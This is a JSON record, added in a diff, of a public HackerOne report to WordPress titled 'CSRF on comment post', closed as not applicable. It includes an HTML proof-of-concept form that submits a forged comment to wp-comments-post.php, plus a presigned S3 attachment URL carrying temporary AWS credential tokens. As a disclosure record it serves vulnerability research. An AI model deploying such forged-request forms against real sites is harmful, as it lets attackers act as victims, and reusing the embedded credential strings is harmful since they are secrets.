@@ -1,0 +1,133 @@
+{
+  "id": 914232,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MTQyMzI=",
+  "url": "https://hackerone.com/reports/914232",
+  "title": "CSRF on comment post",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "medium",
+  "readable_substate": "N/A",
+  "created_at": "2020-07-02T17:11:35.356Z",
+  "submitted_at": "2020-07-02T17:11:35.356Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lamscun",
+    "url": "/lamscun",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/qdhxico2pita58o4uvzfftz7qsji/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 55,
+    "url": "https://hackerone.com/wordpress",
+    "handle": "wordpress",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "WordPress",
+      "twitter_handle": "wordpress",
+      "website": "https://wordpress.org/",
+      "about": "Beautiful sites of any kind."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-07-16T11:14:43.361Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-07-15T20:00:09.336Z",
+  "team_member_agreed_on_going_public_at": "2020-07-16T11:14:43.231Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Wordpress,\n\nI just found an CSRF on comment post. It allow attacker make victim comments on a post.\n\n## Steps To Reproduce:\nAttacker send to victim a link with content below:\n\n```\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://localhost/wordpress/wordpress-5.4.2/wordpress/wp-comments-post.php\" method=\"POST\">\n      <input type=\"hidden\" name=\"comment\" value=\"csrf&#95;comment\" />\n      <input type=\"hidden\" name=\"submit\" value=\"Post&#32;Comment\" />\n      <input type=\"hidden\" name=\"comment&#95;post&#95;ID\" value=\"29\" />\n      <input type=\"hidden\" name=\"comment&#95;parent\" value=\"0\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n\n```\n\nVideo poc: {F891759}\n\n## Impact\n\nAttacker make victim comments on a post.",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 891759,
+      "file_name": "comment_csrf.wmv",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9UNigjhqk7TG2ouu3PDgNoQa?response-content-disposition=attachment%3B%20filename%3D%22comment_csrf.wmv%22%3B%20filename%2A%3DUTF-8%27%27comment_csrf.wmv&response-content-type=video%2Fx-ms-wmv&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRDPXQFHY%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T094843Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCccVFE43c0%2FqzszfIh8Rib1peQ882voQytuZhfkYCdhgIhAOAKADGAD9Chq2YWhi7tJuGKBuIFx7ytU4wLCQyOdle8KroFCP7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzWfyeB%2F6R34UMYsy0qjgU7AqmGDHuQeO3qG%2F61zBJUeE2mm0UpZoQnSN%2FMydzhCzdCa2ez2DhDMPbJuFYX%2BZCkRyD%2Bm6ZtyfkVNujigICsQVuTBr5ABpZYj%2FWpS2XPzv%2BinwlmCXdSetQkpjVb3cnwbXi62yQQcI%2Fyrlbs3mDXagknnIPONJtRUDk7LqyW%2F8mSd%2BfyLNr02B%2FZRd7HyKB%2BqHbH7P1Yc%2BvgacquiTVPaz5RNg9ShrQkipXRX6pmHq3PLc1abPpHIq6ybk0lNEsMqsfAoQF%2F5jHE84FnraHIOiVWE2M4mV9HRFvysAMQ6KFmsMC0XmCE%2Fex4Bscr6d1kkDDhFgAqDgY8vhLf6a8TPFuoGLfzAvzS4rejABvI7JTxospqX4JCDbPwGhjyxK3aGODmodvVcmbya3Ern7FiKMzd8cPXLb0zJvwlOojdmM%2Fa%2BrJbPgrgzYr%2F%2BaiSgmWR%2BTr9LJL4TGK0XQBy0B4EMpTaMs%2BvwN0fWiT8pXFQWEkCA61u5gvXcT4%2F8bvSLYqrlHSGz6TxAHJaQnTdplWaZSLq6zaLalG1e7DhQ91%2Bj9JW20fhhpmjWrk76OxQgWbAqFTjlTNraqbxFq%2FQFXYDFY%2FP6fwYEZMdGkpnzZLatq%2FPHKy7sb7Sbwm8cFlcQL%2FNa9QAKq2iR38DiFIKyXD0fPvN%2B403u0W%2BdHiKTxwh3mPJ1cUhuG14UTjSpCg%2BkSqhAL6NqY4CNPZRMlkTKlHTFOkb49uOrcQltH6OlnjOP3YI8JwLVPG1pwGEXJKmG5ZzX0RZdzkni3KyxAAvFSak4caxz6pMpa8p4nktAoBLPQ94OH8eS6Hmz%2FnhAxLmvgE0BbSWp6hUZI2SldpfHCtFHktvWf1fE9yh064uyR0w7Iy%2BxgY6sAE597VJyuDy4HO4wJm9v2u32x8Exmewui9retfmyhjC8S6TGUtn5G7CsXe8dH4l7ad3ikU28ztI3f2UsJeR9YOE35MGhM4P%2BBAWIqqFbvIXaJ4RAtRoe2s6x9xnQ5o6oG97SIXiHjuheNLgZ3NaQ8OXD7LQOqwmkjXvufc5WBUzx1oR82Rh7a6LCkNk8aRMCipYjcpWC0vLSSJfa3tOxAqurSLE15Uh1jQJ%2Fr4MljWr%2Bw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fb5b2db34d65aed1359be10fb80df810dcc9d1ff70649d609933b5b2474ed55f",
+      "file_size": 3897041,
+      "type": "video/x-ms-wmv",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 4,
+  "voters": [
+    "loaymorad",
+    "thaivu",
+    "safehacker_2715",
+    "b69fb2ebda43240ece9dbeb"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.2,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2750,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "WordPress Core",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
